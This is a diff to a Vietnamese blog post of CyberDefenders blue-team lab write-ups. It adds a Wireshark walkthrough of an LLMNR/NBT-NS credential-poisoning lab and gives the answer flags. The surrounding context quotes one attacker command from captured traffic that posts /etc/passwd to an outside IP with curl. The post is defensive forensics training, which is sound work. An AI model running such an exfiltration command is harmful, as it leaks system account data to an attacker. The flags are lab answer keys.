@@ -1,6 +1,6 @@
 ---
 title: (VietNamese) CyberDefenders Writeup (Author)
-date: 2026-2-20 08:19:33
+date: 2026-3-20 08:19:33
 top_img: /img/cyberdefenders/cyberdefenders
 cover: /img/cyberdefenders/cyberdefenders.png
 categories:
@@ -86,3 +86,85 @@ Thử filter theo command : `tcp.payload and tcp and !http`
 Ở cuối có dòng `curl -X POST -d /etc/passwd http://117.11.88.124:443/`
 Vậy là kẻ địch cố lấy đi file passwd suy ra flag là `passwd`
 
+
+
+# [PoisonedCredentials Lab](https://cyberdefenders.org/blueteam-ctf-challenges/poisonedcredentials/)
+
+**Tool sử dụng trong bài**: Wireshark
+
+**Scenario** (tình huống): 
+>Your organization's security team has detected a surge in suspicious network activity. There are concerns that LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning attacks may be occurring within your network. These attacks are known for exploiting these protocols to intercept network traffic and potentially compromise user credentials. Your task is to investigate the network logs and examine captured network traffic.
+
+Tóm tắt : 
+Đội ngũ bảo mật của tổ chức phát hiện lưu lượng mạng đáng ngờ tăng mạnh. Họ nghi ngờ trong mạng đang xảy ra tấn công LLMNR và NBT-NS poisoning. Kiểu tấn công này lợi dụng hai giao thức trên để đánh chặn lưu lượng mạng và có thể đánh cắp hoặc làm lộ thông tin đăng nhập của người dùng. Nhiệm vụ của bạn là điều tra log mạng và phân tích gói tin đã capture để xác minh sự việc.
+
+Giải thích : 
+- LLMNR (Link-Local Multicast Name Resolution) là giao thức của Microsoft (từ Windows Vista) cho phép các thiết bị trong cùng mạng cục bộ (LAN) phân giải tên máy chủ thành địa chỉ IP khi truy vấn DNS thất bại. Nó hoạt động như cơ chế dự phòng, thay thế NetBIOS, cho phép tìm kiếm máy in/chia sẻ tệp mà không cần máy chủ DNS trung tâm
+- SMB(Server Message Block): Là giao thức chia sẻ file của Windows.
+- LLMNR và NBT-NS được sử dụng khi DNS request fail trên hệ thông của Windows. Khi đó 2 giao thức này sẽ đóng vai trò như name resolution dự phòng (fallback name resolution)
+- LLMNR và NBT-NS có thể triển khai thành Poisoning attack bằng cách lợi dụng việc client gửi sai SMB share adress, khi này DNS sẽ trả về kết quả không thấy địa chỉ đó. Sau đó hệ thông máy tính của client sẽ tự động đổi qua LLMNR / NBT-NS request và kẻ tấn công có thể lợi dụng điều đó để tạo ra server xác nhận rằng đúng địa chỉ.
+
+* Mô phỏng qua cuộc tấn công 
+![image](https://hackmd.io/_uploads/r12AqvCcZg.png)
+
+## Solution 
+## Câu 1
+ >Tìm query bị gõ sai của ip 192.168.232.162
+
+![image](https://hackmd.io/_uploads/r1cu23wq-e.png)
+
+Mở wireshark filter thử 
+`ip.addr == 192.168.232.162 and llmnr`
+![image](https://hackmd.io/_uploads/rkOlDwAc-x.png)
+Vậy flag là `fileshaare`
+
+## Câu 2 
+>Tìm địa chỉ ip máy khả nghi 
+
+![image](https://hackmd.io/_uploads/B1YzPvAqWx.png)
+![image](https://hackmd.io/_uploads/r10HnPAc-g.png)
+
+Vẫn filter theo command cũ 
+Và mình nhận ra tại packet 71, 72 , .... có cùng 1 ip source thử nhập ip đó vào flag 
+
+
+![image](https://hackmd.io/_uploads/Hy7ShPRqWl.png)
+
+## Câu 3
+> Tìm địa chỉ máy đã bị tấn công
+![image](https://hackmd.io/_uploads/r1PrAPAcWx.png)
+
+Vì đã có địa chỉ máy khả nghi ở câu 2 nên ta thử filter theo 
+`ip.src == 192.168.232.215 and llmnr`
+![image](https://hackmd.io/_uploads/SJ0nn_Aq-g.png)
+
+
+Sau khi filter thu được 2 địa chỉ 
+* 192.168.232.162
+* 192.168.232.176
+
+Yah thử 2 ip vào thì ra flag là 
+`192.168.232.176`
+
+
+## Câu 4
+>Tài khoản nào đã gửi credential cho attacker?
+
+![image](https://hackmd.io/_uploads/B1Ncg-ys-e.png)
+Vì biết được attacker dùng protocol SMB hoặc SMB2 nên mình đã filter như sau : 
+
+![image](https://hackmd.io/_uploads/HkO8WWJjZx.png)
+
+Ở packet 242 thấy user name là **janesmith**
+
+Vậy flag là `janesmith`
+
+## Câu 5 
+>Tên của hostname bị tấn công qua SMB 
+
+![image](https://hackmd.io/_uploads/BJfyM-Ji-x.png)
+
+Thử tra google về cách identify hostname mình tìm được kết quả 
+![image](https://hackmd.io/_uploads/BySpzWkjZg.png)
+Và flag là : `AccountingPC`
+![image](https://hackmd.io/_uploads/SyVSVZksWg.png)
